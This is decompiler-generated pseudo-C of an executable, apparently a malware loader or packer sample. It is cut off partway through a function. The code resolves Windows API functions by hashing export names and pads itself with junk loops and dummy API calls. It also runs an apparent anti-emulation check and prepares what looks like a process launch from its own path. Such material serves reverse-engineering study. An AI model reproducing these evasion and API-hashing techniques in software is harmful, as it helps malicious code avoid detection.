// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 00401000: Register word32 fn00401000()
word32 fn00401000()
{
	GetModuleHandleA(null);
	GetStdHandle(~0x57);
	GetStdHandle(~0x47);
	Eq_12 eax_36 = GetCurrentProcess();
	ptr32 esp_49;
	word32 ebp_50;
	byte SCZO_51;
	word32 ebx_52;
	word32 esi_53;
	struct Eq_25 * edi_54;
	word32 eax_55;
	word32 edx_56;
	byte SZO_57;
	byte C_58;
	word32 ecx_59;
	byte cl_60;
	globals->ptr4056C0();
	*(esp_49 - 0x04) = ~0x54;
	GetStdHandle(*(esp_49 - 0x04));
	*(esp_49 - 0x08) = fp - 0x14;
	*(esp_49 - 0x0C) = edi_54->dw0050;
	*(esp_49 - 0x10) = ebx_52;
	*(esp_49 - 0x14) = eax_55;
	*(esp_49 - 0x18) = globals->dw4056B0;
	ptr32 esp_82;
	word32 ebp_83;
	byte SCZO_84;
	word32 ebx_85;
	word32 esi_86;
	word32 edi_87;
	word32 eax_88;
	word32 edx_89;
	byte SZO_90;
	byte C_91;
	word32 ecx_92;
	byte cl_93;
	globals->ptr4056C4();
	int32 eax_118 = 0x00;
	do
		eax_118 = eax_118 + 0x04;
	while (eax_118 <= 0x02);
	globals->dw4056C8 = 0x00010007;
	*(esp_82 - 0x04) = 0x004056C8;
	*(esp_82 - 0x08) = globals->dw4056B4;
	ptr32 esp_138;
	word32 ebp_139;
	byte SCZO_140;
	word32 ebx_141;
	word32 esi_142;
	word32 edi_143;
	word32 eax_144;
	word32 edx_145;
	byte SZO_146;
	byte C_147;
	word32 ecx_148;
	byte cl_149;
	globals->ptr405994();
	int32 eax_150 = 0x00;
	do
		eax_150 = eax_150 + 0x04;
	while (eax_150 <= 0x08);
	globals->dw405780 = 4200942;
	Eq_12 eax_186 = GetCurrentProcess();
	*(esp_138 - 0x04) = 0x004056C8;
	*(esp_138 - 0x08) = globals->dw4056B4;
	ptr32 esp_192;
	word32 ebp_193;
	byte SCZO_194;
	word32 ebx_195;
	word32 esi_196;
	word32 edi_197;
	word32 eax_198;
	word32 edx_199;
	byte SZO_200;
	byte C_201;
	word32 ecx_202;
	byte cl_203;
	globals->ptr405998();
	*(esp_192 - 0x04) = ~0x2F;
	Eq_12 eax_206 = GetStdHandle(*(esp_192 - 0x04));
	*(esp_192 - 0x08) = globals->dw4056B4;
	struct Eq_188 * esp_210;
	word32 ebp_211;
	byte SCZO_212;
	word32 ebx_213;
	word32 esi_214;
	word32 edi_215;
	word32 eax_216;
	word32 edx_217;
	byte SZO_218;
	byte C_219;
	word32 ecx_220;
	byte cl_221;
	globals->ptr40599C();
	return esp_210->dw0004;
}

// 0040117F: Register word32 fn0040117F(Register ptr32 ebp, Register out ptr32 ebpOut)
word32 fn0040117F(ptr32 ebp, ptr32 & ebpOut)
{
	Eq_7 eax_21 = LoadLibraryA(globals->t405008);
	GetCurrentProcess();
	Eq_7 ebx_28;
	ptr32 ebp_29;
	globals->ptr4059A0 = fn0040157C(eax_21, 1718684612, out ebx_28, out ebp_29);
	int32 eax_35 = 0x01;
	do
	{
		word32 edx_39 = *(ebp_29 - 0x04) + *(ebp_29 - 0x0C);
		*(ebp_29 - 0x04) = edx_39 + 1969 + edx_39;
		eax_35 = eax_35 - 0x03;
	} while (eax_35 >= 0x00);
	Eq_7 ebx_49;
	word32 ebp_50;
	globals->ptr4056C0 = fn0040157C(ebx_28, 3137288613, out ebx_49, out ebp_50);
	GetCurrentProcess();
	Eq_7 ebx_59;
	ptr32 ebp_60;
	globals->ptr4056C4 = fn0040157C(ebx_49, 2303680650, out ebx_59, out ebp_60);
	int32 eax_64 = 0x06;
	do
	{
		word32 edx_66 = *(ebp_60 - 0x0C);
		*(ebp_60 - 0x0C) = edx_66 + 0x1225 + edx_66;
		eax_64 = eax_64 - 0x01;
	} while (eax_64 >= 0x00);
	Eq_7 ebx_77;
	ptr32 ebp_78;
	globals->ptr405994 = fn0040157C(ebx_59, 2321366928, out ebx_77, out ebp_78);
	int32 eax_82 = 0x00;
	do
	{
		*(ebp_78 - 0x0C) = *(ebp_78 - 0x08) + 1414 << (byte) (*(ebp_78 - 0x04) * 0x02);
		eax_82 = eax_82 + 0x03;
	} while (eax_82 <= 0x03);
	Eq_7 ebx_100;
	word32 ebp_101;
	globals->ptr405998 = fn0040157C(ebx_77, 2321356688, out ebx_100, out ebp_101);
	GetCurrentProcess();
	Eq_7 ebx_110;
	ptr32 ebp_111;
	globals->ptr40599C = fn0040157C(ebx_100, 557334073, out ebx_110, out ebp_111);
	int32 eax_115 = 0x04;
	do
	{
		ui32 ecx_119 = *(ebp_111 - 0x08);
		*(ebp_111 - 0x0C) = *(ebp_111 - 0x04) * 0x08 + 3391 & (ecx_119 + 0x01A0) + ecx_119;
		eax_115 = eax_115 - 0x03;
	} while (eax_115 >= 0x00);
	Eq_7 ebx_130;
	ptr32 ebp_131;
	globals->ptr4059A4 = fn0040157C(ebx_110, 3533161828, out ebx_130, out ebp_131);
	uint32 eax_135 = *(ebp_131 - 0x04);
	ui32 edx_136 = *(ebp_131 - 0x0C);
	*(ebp_131 - 0x04) = eax_135 + 4184 >> (byte) (((eax_135 * 0x02 + edx_136 * 0x08) + edx_136 * 0x04) + 0x1435);
	word32 ebx_152;
	ptr32 ebp_153;
	globals->ptr4059A8 = fn0040157C(ebx_130, 0x921C0124, out ebx_152, out ebp_153);
	GetModuleFileNameA(null, 0x004059AC, 0x0104);
	GetCurrentProcess();
	lstrcpyA(0x00405AB0, globals->t405000);
	GetCurrentProcess();
	lstrcatA(0x00405AB0, globals->t40502C);
	GetStdHandle(~0x02);
	lstrcatA(0x00405AB0, globals->t405014);
	GetCurrentProcess();
	lstrcatA(0x00405AB0, &globals->t4059AC);
	word32 eax_193 = *(ebp_153 - 0x0C);
	*(ebp_153 - 0x08) = eax_193 + 0x06DF + eax_193;
	globals->dw405BB4 = 0x44;
	GetStdHandle(~0x4F);
	globals->dw405BE0 = 0x01;
	GetStdHandle(~0x39);
	globals->w405BE4 = 0x02;
	int32 eax_205 = 0x00;
	do
	{
		uint32 edx_209 = *(ebp_153 - 0x04);
		word32 ecx_221 = *(ebp_153 - 0x0C);
		byte cl_218 = (byte) (edx_209 * 0x08 + 0x125E + (((edx_209 + 0x0C3C) + *(ebp_153 - 0x08) * 0x02) - edx_209 * 0x02));
		ui32 ecx_222 = ecx_221 + 0x19 + ecx_221;
		ui32 edx_223 = edx_209 + 0x170D >> cl_218 & ecx_222;
		*(ebp_153 - 0x04) = edx_223;
		eax_205 = eax_205 + 0x03;
	} while (eax_205 <= 0x05);
	ptr32 esp_248;
	ptr32 ebp_249;
	byte SCZO_250;
	word32 ebx_251;
	word32 esi_252;
	word32 edi_253;
	word32 eax_254;
	byte SZO_255;
	byte C_256;
	word32 edx_257;
	byte SO_258;
	word32 ecx_259;
	byte cl_260;
	globals->ptr4059A0();
	int32 eax_263 = 0x01;
	do
	{
		*(ebp_249 - 0x0C) = *(ebp_249 - 0x0C) & 0x00;
		eax_263 = eax_263 - 0x04;
	} while (eax_263 >= 0x00);
	*(esp_248 - 0x04) = globals->dw405020;
	ptr32 esp_275;
	word32 ebp_276;
	byte SCZO_277;
	word32 ebx_278;
	word32 esi_279;
	word32 edi_280;
	word32 eax_281;
	byte SZO_282;
	byte C_283;
	word32 edx_284;
	byte SO_285;
	word32 ecx_286;
	byte cl_287;
	globals->ptr4059A8();
	*(esp_275 - 0x04) = ~0x40;
	GetStdHandle(*(esp_275 - 0x04));
	*(esp_275 - 0x08) = 544316462;
	*(esp_275 - 0x0C) = eax_281;
	word32 ebx_298;
	word32 ebp_299;
	globals->ptr405BF8 = fn0040157C(dwArg00, dwArg04, out ebx_298, out ebp_299);
	GetCurrentProcess();
	*(esp_275 - 0x08) = 0x5019BCD5;
	*(esp_275 - 0x0C) = ebx_298;
	word32 ebx_308;
	ptr32 ebp_309;
	globals->ptr405BFC = fn0040157C(dwArg00, dwArg04, out ebx_308, out ebp_309);
	uint32 esi_315 = *(ebp_309 - 0x08);
	ui32 eax_313 = *(ebp_309 - 0x0C);
	*(ebp_309 - 0x0C) = eax_313 + 0x1EA5 ^ esi_315 + 0x02BA >> (byte) (eax_313 * 0x02) | (esi_315 * 0x02) *s (*(ebp_309 - 0x04) * 0x04 + 0x1151) >> (byte) (eax_313 << 0x02) & eax_313 * 0x02 + 0x9E;
	*(esp_275 - 0x08) = 2554159833;
	*(esp_275 - 0x0C) = ebx_308;
	word32 ebx_341;
	ptr32 ebp_342;
	globals->ptr405C00 = fn0040157C(dwArg00, dwArg04, out ebx_341, out ebp_342);
	int32 eax_346 = 0x07;
	do
	{
		ui32 edx_348 = *(ebp_342 - 0x0C);
		uint32 edi_365 = (word32) ((edx_348 * 0x02 + 0x68) *s (*(ebp_342 - 0x08) + 4663)) + -(edx_348 * 0x02 + 0xA3) >> (byte) (*(ebp_342 - 0x08) * 0x02);
		*(ebp_342 - 0x04) = edx_348 * 0x02 | edx_348 * 0x02 + 0x1D01 >> (byte) (*(ebp_342 - 0x04) + 0x0869) & edi_365;
		eax_346 = eax_346 - 0x04;
	} while (eax_346 >= 0x00);
	*(esp_275 - 0x08) = 979498717;
	*(esp_275 - 0x0C) = ebx_341;
	word32 ebx_377;
	ptr32 ebp_378;
	globals->ptr405C04 = fn0040157C(dwArg00, dwArg04, out ebx_377, out ebp_378);
	int32 eax_382 = 0x00;
	do
	{
		uint32 edx_386 = *(ebp_378 - 0x0C);
		ui32 ecx_394 = *(ebp_378 - 0x04);
		*(ebp_378 - 0x08) = edx_386 + 3235 >> (byte) ((*(ebp_378 - 0x08) + 0x087F) + edx_386 * 0x02) & (ecx_394 + 0x113F) + ecx_394;
		eax_382 = eax_382 + 0x02;
	} while (eax_382 <= 0x09);
	*(esp_275 - 0x08) = 0x84FB24B8;
	*(esp_275 - 0x0C) = ebx_377;
	word32 ebx_405;
	ptr32 ebp_406;
	globals->ptr405C08 = fn0040157C(dwArg00, dwArg04, out ebx_405, out ebp_406);
	int32 eax_410 = 0x05;
	do
	{
		ui32 edx_412 = *(ebp_406 - 0x04);
		byte cl_417 = (byte) (edx_412 * 0x02 * 0x02);
		ui32 edx_419 = edx_412 + 6199 << cl_417;
		*(ebp_406 - 0x0C) = edx_419;
		eax_410 = eax_410 - 0x03;
	} while (eax_410 >= 0x00);
	*(esp_275 - 0x08) = globals->dw405028;
	ptr32 esp_427;
	word32 ebp_428;
	byte SCZO_429;
	word32 ebx_430;
	word32 esi_431;
	word32 edi_432;
	word32 eax_433;
	byte SZO_434;
	byte C_435;
	word32 edx_436;
	byte SO_437;
	word32 ecx_438;
	byte cl_439;
	globals->ptr4059A8();
	GetCurrentProcess();
	*(esp_427 - 0x04) = 0x0F4B499B;
	*(esp_427 - 0x08) = eax_433;
	word32 ebx_446;
	word32 * ebp_447;
	globals->ptr405C0C = fn0040157C(dwArg00, dwArg04, out ebx_446, out ebp_447);
	*(esp_427 - 0x04) = ~0x49;
	GetStdHandle(*(esp_427 - 0x04));
	word32 esi_454 = fn00401000();
	*(esp_427 - 0x08) = ~0x24;
	GetStdHandle(*(esp_427 - 0x08));
	*(ebp_447 - 0x04) = 192480998;
	*(ebp_447 - 0x08) = esi_454;
	*(ebp_447 - 0x0C) = 1123933084;
	word32 ebp_470;
	*ebpOut = *ebp_447;
	return 0x00;
}

// 0040157C: Register word32 fn0040157C(Stack Eq_7 dwArg04, Stack uint32 dwArg08, Register out ptr32 ebxOut, Register out ptr32 ebpOut)
word32 fn0040157C(HMODULE dwArg04, uint32 dwArg08, ptr32 & ebxOut, ptr32 & ebpOut)
{
	GetStdHandle(~0x0D);
	GetStdHandle(~0x3D);
	struct Eq_997 * eax_43 = dwArg04 + (&(dwArg04 + dwArg04->ptr003C / 0x0040)->ptr003C)[0x0F] / 0x0040;
	word16 eax_46[] = dwArg04 + eax_43->dw0024 / 0x0040;
	GetCurrentProcess();
	uint32 dwLoc04_109 = ebp;
	uint32 esi_19 = dwArg08;
	struct Eq_1016 * esp_114 = fp - 0x60;
	if (StgCreateStorageEx(null, 0x00, 0x00, 0x00, null, null, null, null) == 0x00)
		esi_19 = dwArg08 - 0x000CF53C;
	word32 eax_74[] = dwArg04 + eax_43->dw0020 / 0x0040;
	word32 eax_78[] = dwArg04 + eax_43->dw001C / 0x0040;
	int32 edi_181 = 0x00;
	while (true)
	{
		word32 eax_111;
		if (edi_181 >= eax_43->dw0018)
			break;
		int32 eax_134 = 0x00;
		do
			eax_134 = eax_134 + 0x05;
		while (eax_134 <= 0x02);
		Eq_1085 (* eax_152)[] = dwArg04 + eax_74[edi_181] / 0x0040;
		dwLoc28 = dwLoc28 & 0x00;
		dwLoc2C = dwLoc2C & 0x00;
		while (Mem0[dwLoc28 + eax_152:byte] != 0x00)
		{
			GetCurrentProcess();
			dwLoc2C = (int32) Mem0[dwLoc28 + eax_152:byte] ^ 0x2F ^ (dwLoc2C << 0x07 | dwLoc2C >>u 0x19);
			dwLoc28 = dwLoc28 + 0x01;
		}
		if (dwLoc2C == esi_19)
		{
			GetStdHandle(~0x28);
			esp_114 = fp - 100;
			eax_111 = dwArg04 + eax_78[(word32) eax_46[edi_181]] / 0x0040;
			goto l004016D5;
		}
		edi_181 = edi_181 + 0x01;
	}
	dwLoc04_109 = esi_19;
	eax_111 = 0x00;
l004016D5:
	word32 ebx_119;
	*ebxOut = esp_114->dw0008;
	word32 ebp_121;
	*ebpOut = dwLoc04_109;
	return eax_111;
}

// 00401C90: Register Eq_10 Win32CrtStartup()
DWORD Win32CrtStartup()
{
	fs->ptr0000 = fp - 0x14;
	globals->t405058 = fn00402860(0x02000000);
	ptr32 ebp_139 = fp - 0x04;
	if (fn00402050() == 0x00)
	{
		*(fp - 116) = 0x01;
		fn00402140(dwArg00);
	}
	fn00402150(edx, ebx);
	fn004021C0();
	fn00402210(fp - 0x04);
	fn004025F0(fp - 0x04);
	fn00402690(fp - 0x04);
	ptr32 esp_138 = fp - 0x70;
	<anonymous> ** ebx_151 = (<anonymous> **) 0x004040E0;
	while (ebx_151 < (<anonymous> **) 0x004040E0)
	{
		byte SCZO_141;
		word32 ebx_142;
		word32 esi_143;
		word32 edi_144;
		word32 ecx_145;
		word32 eax_146;
		byte SZO_147;
		byte C_148;
		byte Z_149;
		word32 edx_150;
		(*ebx_151)();
		ebx_151 = ebx_142 + 0x04;
	}
	word32 edx_134;
	LPSTARTUPINFOA * esp_62 = esp_138 - 0x04;
	*esp_62 = (LPSTARTUPINFOA *) (fp - 100);
	GetStartupInfoA(*esp_62);
	*(esp_62 - 0x04) = 0x00;
	Eq_7 eax_66 = GetModuleHandleA(*(esp_62 - 0x04));
	word32 eax_68 = fn00402750();
	if (0x00 != 0x00)
		edx_134 = (word32) wLoc34;
	else
		edx_134 = 0x0A;
	*(esp_62 - 0x08) = edx_134;
	*(esp_62 - 0x0C) = eax_68;
	*(esp_62 - 0x10) = 0x00;
	*(esp_62 - 0x14) = (HMODULE *) eax_66;
	ptr32 ebp_119;
	Eq_10 eax_126 = fn0040117F(ebp_139, out ebp_119);
	ptr32 esp_118 = esp_62 - 0x04;
	Eq_10 ebx_122 = eax_126;
	<anonymous> ** esi_131 = (<anonymous> **) 0x004040E0;
	while (esi_131 < (<anonymous> **) 0x004040E0)
	{
		byte SCZO_121;
		word32 esi_123;
		word32 edi_124;
		word32 ecx_125;
		byte SZO_127;
		byte C_128;
		byte Z_129;
		word32 edx_130;
		(*esi_131)();
		esi_131 = esi_123 + 0x04;
	}
	*(esp_118 - 0x04) = (uint32) ebx_122;
	fn00402790(ebx_122, dwArg00);
	*(ebp_119 - 0x04) = *(ebp_119 - 0x04) | ~0x00;
	fs->ptr0000 = *(ebp_119 - 0x10);
	return eax_126;
}

// 00402050: Register word32 fn00402050()
word32 fn00402050()
{
	Eq_12 eax_8 = HeapCreate(0x01, 0x1000, 0x00);
	globals->t405698 = eax_8;
	if (eax_8 == null)
		return 0x00;
	else
		return 0x01;
}

// 004020A0: Register Eq_1131 fn004020A0(Stack Eq_1131 dwArg04)
Eq_1131 fn004020A0(Eq_1131 dwArg04)
{
	return HeapAlloc(globals->t405698, 0x01, dwArg04);
}

// 004020E0: void fn004020E0(Stack Eq_1131 dwArg04)
void fn004020E0(Eq_1131 dwArg04)
{
	HeapFree(globals->t405698, 0x01, dwArg04);
}

// 00402140: void fn00402140(Stack Eq_1131 dwArg04)
void fn00402140(Eq_1131 dwArg04)
{
	ExitProcess(dwArg04);
}

// 00402150: void fn00402150(Register word32 edx, Register word32 ebx)
void fn00402150(word32 edx, word32 ebx)
{
	if ((SCZDOP ^ 0x00200000 ^ SCZDOP) != 0x00)
	{
		int32 eax_41;
		word32 ebx_42;
		Eq_1358 ecx_43;
		word32 edx_44;
		__cpuid(0x00, SCZDOP, &eax_41, &ebx_42, &ecx_43, &edx_44);
		if (eax_41 >= 0x01)
		{
			word32 eax_48;
			word32 ebx_49;
			ui32 ecx_50;
			ui32 edx_51;
			__cpuid(0x01, ecx_43, &eax_48, &ebx_49, &ecx_50, &edx_51);
			ui32 eax_52 = 0x00;
			if ((edx_51 & 0x00800000) != 0x00)
				eax_52 = 0x01;
			if ((edx_51 & 0x01000000) != 0x00)
				eax_52 = eax_52 | 0x10;
			if ((edx_51 & 0x02000000) != 0x00)
				eax_52 = eax_52 | 0x02;
			if ((edx_51 & 0x04000000) != 0x00)
				eax_52 = eax_52 | 0x04;
			if ((ecx_50 & 0x01) != 0x00)
				eax_52 = eax_52 | 0x08;
			globals->dw405110 = eax_52;
		}
	}
}

// 004021C0: void fn004021C0()
void fn004021C0()
{
	GetSystemTimeAsFileTime(&globals->t4056A0);
}

// 00402210: void fn00402210(Register ptr32 ebp)
void fn00402210(ptr32 ebp)
{
	word32 ebx_19;
	word32 esi_20;
	word32 edi_21;
	struct Eq_1436 * eax_22 = fn00402E30(0x0100, out ebx_19, out esi_20, out edi_21);
	struct Eq_1436 * ebx_26 = eax_22;
	if (eax_22 == null)
	{
		*(fp - 0x6C) = 0x01;
		fn00402140(dwArg00);
	}
	globals->ptr406010 = eax_22;
	globals->t406110.u0 = 0x20;
	while (ebx_26 < globals->ptr406010 + 0x0020)
	{
		ebx_26->b0004 = 0x00;
		ebx_26->dw0000 = ~0x00;
		ebx_26->b0005 = 0x0A;
		ebx_26 = ebx_26 + 0x01;
	}
	*(fp - 0x6C) = fp - 0x48;
	GetStartupInfoA(*(fp - 0x6C));
	word32 * esp_112 = fp - 0x6C;
	if (wLoc16 != 0x00 && dwLoc14 != null)
	{
		Eq_1131 esi_192 = *dwLoc14;
		byte * dwLoc54_194 = (char *) dwLoc14 + 0x04;
		word32 dwLoc50_197 = esi_192 + (dwLoc14 + 0x04);
		if (esi_192 > 0x0800)
			esi_192.u0 = 0x0800;
		if (globals->t406110 < esi_192)
		{
			do
			{
				*(fp - 0x70) = 0x0100;
				word32 ebx_281;
				ui32 edi_283;
				struct Eq_1436 * eax_284 = fn00402E30(dwArg00, out ebx_281, out esi_192, out edi_283);
				struct Eq_1436 * ebx_287 = eax_284;
				if (eax_284 == null)
				{
					esi_192 = globals->t406110;
					break;
				}
				(&globals->ptr406010)[edi_283].dw0000 = eax_284;
				globals->t406110 = (word32) globals->t406110 + 0x0020;
				while (ebx_287 < (&globals->ptr406010)[edi_283] + 0x0100)
				{
					ebx_287->b0004 = 0x00;
					ebx_287->dw0000 = ~0x00;
					ebx_287->b0005 = 0x0A;
					ebx_287 = ebx_287 + 0x01;
				}
			} while (globals->t406110 < esi_192);
		}
		esp_112 = fp - 0x6C;
		Eq_1131 edi_212 = 0x00;
		if (esi_192 > 0x00)
		{
			do
			{
				word32 eax_225 = *dwLoc50_197;
				if (eax_225 != ~0x00)
				{
					ui32 edx_245 = (word32) *dwLoc54_194;
					if ((edx_245 & 0x01) == 0x00)
						goto l00402356;
					if ((edx_245 & 0x08) == 0x00)
					{
						esp_112 = esp_112 - 0x04;
						*esp_112 = eax_225;
						if (GetFileType(*esp_112) != 0x00)
							goto l00402333;
					}
					else
					{
l00402333:
						struct Eq_1768 * ebx_262 = (&globals->ptr406010)[edi_212 >> 0x05] + (edi_212 & 0x1F) * 0x08;
						ebx_262->dw0000 = *dwLoc50_197;
						ebx_262->b0004 = *dwLoc54_194;
					}
				}
l00402356:
				edi_212 = (word32) edi_212 + 0x01;
				dwLoc54_194 = dwLoc54_194 + 0x01;
				dwLoc50_197 = dwLoc50_197 + 0x01;
			} while (edi_212 < esi_192);
		}
	}
	int32 edi_62 = 0x00;
	do
	{
		struct Eq_1557 * ebx_78 = globals->ptr406010 + edi_62;
		if (ebx_78->t0000 == (void *) ~0x00)
		{
			word32 eax_111;
			ebx_78->b0004 = 0x81;
			if (edi_62 == 0x00)
				eax_111 = ~0x09;
			else if (edi_62 == 0x01)
				eax_111 = ~0x0A;
			else
				eax_111 = ~0x0B;
			esp_112 = esp_112 - 0x04;
			*esp_112 = eax_111;
			Eq_12 eax_114 = GetStdHandle(*esp_112);
			Eq_12 esi_115 = eax_114;
			if (eax_114 != (void *) ~0x00)
			{
				*(esp_112 - 0x04) = (HANDLE *) eax_114;
				esp_112 = esp_112 - 0x04;
				Eq_10 eax_128 = GetFileType(*(esp_112 - 0x04));
				if (eax_128 == 0x00)
					goto l00402408;
				Eq_12 eax_133 = GetCurrentProcess();
				Eq_12 eax_135 = GetCurrentProcess();
				*(esp_112 - 0x08) = 0x02;
				*(esp_112 - 0x0C) = 0x01;
				*(esp_112 - 0x10) = 0x00;
				*(esp_112 - 0x14) = fp - 0x4C;
				*(esp_112 - 0x18) = (HANDLE *) eax_135;
				*(esp_112 - 0x1C) = (HANDLE *) eax_114;
				*(esp_112 - 0x20) = (HANDLE *) eax_133;
				esp_112 = esp_112 - 0x20;
				if (DuplicateHandle(*(esp_112 - 0x20), *(esp_112 - 0x1C), *(esp_112 - 0x18), *(esp_112 - 0x14), *(esp_112 - 0x10), *(esp_112 - 0x0C), *(esp_112 - 0x08)) != 0x00)
					esi_115 = dwLoc4C;
				ebx_78->t0000 = esi_115;
				if ((eax_128 & 0xFF) == 0x02)
					ebx_78->b0004 = ebx_78->b0004 | 0x40;
				else if ((eax_128 & 0xFF) == 0x03)
					ebx_78->b0004 = ebx_78->b0004 | 0x08;
			}
			else
			{
l00402408:
				ebx_78->b0004 = ebx_78->b0004 | 0x40;
			}
		}
		else
			ebx_78->b0004 = ebx_78->b0004 | 0x80;
		edi_62 = edi_62 + 0x01;
	} while (edi_62 < 0x03);
	union Eq_1131 * esp_95 = esp_112 - 0x04;
	*esp_95 = (union Eq_1131 *) globals->t406110;
	SetHandleCount(*esp_95);
}

// 00402460: void fn00402460(Stack Eq_1131 dwArg04, Stack (ptr word32) dwArg08, Stack (ptr byte) dwArg0C, Stack (ptr word32) dwArg10, Stack (ptr word32) dwArg14)
void fn00402460(Eq_1131 dwArg04, word32 * dwArg08, byte * dwArg0C, word32 * dwArg10, word32 * dwArg14)
{
	*dwArg14 = 0x00;
	*dwArg10 = 0x01;
	word32 * edx_19 = dwArg08;
	byte * ebx_105 = dwArg0C;
	Eq_1131 edi_106 = dwArg04;
	if (dwArg08 != null)
	{
		*dwArg08 = dwArg0C;
		edx_19 = dwArg08 + 0x01;
	}
	if (*dwArg04 == 0x22)
	{
		while (true)
		{
			edi_106 = (word32) edi_106 + 0x01;
			if (*edi_106 == 0x22 || *edi_106 == 0x00)
				break;
			if (ebx_105 != null)
			{
				*ebx_105 = (byte) *edi_106;
				ebx_105 = ebx_105 + 0x01;
			}
			*dwArg14 = *dwArg14 + 0x01;
		}
		if (ebx_105 != null)
		{
			*ebx_105 = 0x00;
			ebx_105 = ebx_105 + 0x01;
		}
		*dwArg14 = *dwArg14 + 0x01;
		if (*edi_106 == 0x22)
			edi_106 = (word32) edi_106 + 0x01;
	}
	else
	{
		do
		{
			if (ebx_105 != null)
			{
				*ebx_105 = (byte) *edi_106;
				ebx_105 = ebx_105 + 0x01;
			}
			*dwArg14 = *dwArg14 + 0x01;
			edi_106 = (word32) edi_106 + 0x01;
			byte al_289 = *edi_106;
		} while (al_289 != 0x20 && (al_289 != 0x00 && al_289 != 0x09));
		if (al_289 == 0x00)
			edi_106 = edi_106 - 0x01;
		else if (ebx_105 != null)
			*(ebx_105 - 0x01) = 0x00;
	}
	word32 dwLoc08_101 = 0x00;
	while (true)
	{
		if (*edi_106 != 0x00)
		{
			while (true)
			{
				byte al_227 = *edi_106;
				if (al_227 != 0x20 && al_227 != 0x09)
					break;
				edi_106 = (word32) edi_106 + 0x01;
			}
		}
		if (*edi_106 == 0x00)
			break;
		if (edx_19 != null)
		{
			*edx_19 = ebx_105;
			edx_19 = edx_19 + 0x01;
		}
		*dwArg10 = *dwArg10 + 0x01;
		while (true)
		{
			uint32 dwLoc14_102 = 0x00;
			while (*edi_106 == 0x5C)
			{
				edi_106 = (word32) edi_106 + 0x01;
				dwLoc14_102 = dwLoc14_102 + 0x01;
			}
			word32 dwLoc0C_165 = 0x01;
			if (*edi_106 == 0x22)
			{
				dwLoc0C_165 = 0x01;
				if ((bLoc14 & 0x01) == 0x00)
				{
					if (dwLoc08_101 != 0x00)
					{
						if (*((word32) edi_106 + 0x01) == 0x22)
						{
							edi_106 = (word32) edi_106 + 0x01;
							dwLoc0C_165 = 0x01;
						}
						else
							dwLoc0C_165 = 0x00;
					}
					else
						dwLoc0C_165 = 0x00;
					dwLoc08_101 = (word32) (dwLoc08_101 == 0x00);
				}
				dwLoc14_102 = dwLoc14_102 >> 0x01;
			}
			while (true)
			{
				dwLoc14_102 = dwLoc14_102 - 0x01;
				if (dwLoc14_102 == 0x00)
					break;
				if (ebx_105 != null)
				{
					*ebx_105 = 0x5C;
					ebx_105 = ebx_105 + 0x01;
				}
				*dwArg14 = *dwArg14 + 0x01;
			}
			byte al_113 = *edi_106;
			if (al_113 == 0x00 || dwLoc08_101 == 0x00 && (al_113 == 0x20 || al_113 == 0x09))
				break;
			if (dwLoc0C_165 != 0x00)
			{
				if (ebx_105 != null)
				{
					*ebx_105 = (byte) *edi_106;
					ebx_105 = ebx_105 + 0x01;
				}
				*dwArg14 = *dwArg14 + 0x01;
			}
			edi_106 = (word32) edi_106 + 0x01;
		}
		if (ebx_105 != null)
		{
			*ebx_105 = 0x00;
			ebx_105 = ebx_105 + 0x01;
		}
		*dwArg14 = *dwArg14 + 0x01;
	}
	if (edx_19 != null)
		*edx_19 = 0x00;
	*dwArg10 = *dwArg10 + 0x01;
}

// 004025F0: void fn004025F0(Register ptr32 ebp)
void fn004025F0(ptr32 ebp)
{
	Eq_435 eax_13 = GetCommandLineA();
	ptr32 esp_10 = fp - 0x0118;
	Eq_435 ebx_103 = eax_13;
	if (*eax_13 == 0x00)
	{
		GetModuleFileNameA(null, fp - 0x0110, 0x0104);
		esp_10 = fp - 292;
		ebx_103 = fp - 0x0110;
	}
	ptr32 * esp_27 = esp_10 - 0x04;
	*esp_27 = fp - 0x0C;
	*(esp_27 - 0x04) = fp - 0x08;
	*(esp_27 - 0x08) = 0x00;
	*(esp_27 - 0x0C) = 0x00;
	*(esp_27 - 0x10) = (union Eq_435 *) ebx_103;
	fn00402460(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10);
	*esp_27 = dwLoc0C + dwLoc08 * 0x04;
	word32 ebx_52;
	word32 esi_53;
	word32 edi_54;
	struct Eq_1436 * eax_55 = fn00402E30(dwArg00, out ebx_52, out esi_53, out edi_54);
	if (eax_55 == null)
	{
		*esp_27 = 0x01;
		fn00402140(dwArg00);
	}
	ptr32 * esp_65 = esp_10 - 0x04;
	*esp_65 = fp - 0x0C;
	*(esp_65 - 0x04) = fp - 0x08;
	*(esp_65 - 0x08) = eax_55 + (dwLoc08 * 0x04) / 0x08;
	*(esp_65 - 0x0C) = (struct Eq_1436 **) eax_55;
	*(esp_65 - 0x10) = ebx_52;
	fn00402460(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10);
	globals->dw405040 = dwLoc08 - 0x01;
	globals->ptr405044 = eax_55;
}

// 00402690: void fn00402690(Register ptr32 ebp)
void fn00402690(ptr32 ebp)
{
	Eq_2268 eax_148 = GetEnvironmentStrings();
	Eq_2268 ebx_154 = eax_148;
	if (eax_148 == 0x00)
		ebx_154 = globals->t405114;
	Eq_2268 esi_150 = ebx_154;
	word32 ecx_147 = 0x00;
	while (*esi_150 != 0x00)
	{
		Eq_2285 eax_134 = eax_148 | ~0x00;
		do
			eax_134 = (word32) eax_134 + 0x01;
		while (Mem0[esi_150 + eax_134:byte] != 0x00);
		if (*esi_150 != 0x3D)
			ecx_147 = ecx_147 + (eax_134 + 0x01);
		eax_148 = eax_134 + 0x01;
		esi_150 = esi_150 + (eax_134 + 0x01);
	}
	Eq_2268 ebx_43;
	word32 esi_44;
	word32 edi_45;
	struct Eq_1436 * eax_106 = fn00402E30(ecx_147 + 0x01, out ebx_43, out esi_44, out edi_45);
	globals->ptr40504C = eax_106;
	struct Eq_1436 * edi_104 = eax_106;
	if (globals->ptr40504C == null)
	{
		*(fp - 0x18) = 0x01;
		fn00402140(dwArg00);
	}
	Eq_2268 esi_108 = ebx_43;
	while (*esi_108 != 0x00)
	{
		int32 eax_86 = eax_106 | ~0x00;
		do
			eax_86 = eax_86 + 0x01;
		while (*((word32) esi_108 + eax_86) != 0x00);
		if (*esi_108 != 0x3D)
		{
			*(fp - 0x18) = (struct Eq_1436 **) edi_104;
			Eq_2268 edx_111 = esi_108;
			int32 ecx_114 = edi_104 - esi_108;
			do
			{
				byte al_117 = *edx_111;
				*((word32) edx_111 + ecx_114) = al_117;
				edx_111 = (word32) edx_111 + 0x01;
			} while (al_117 != 0x00);
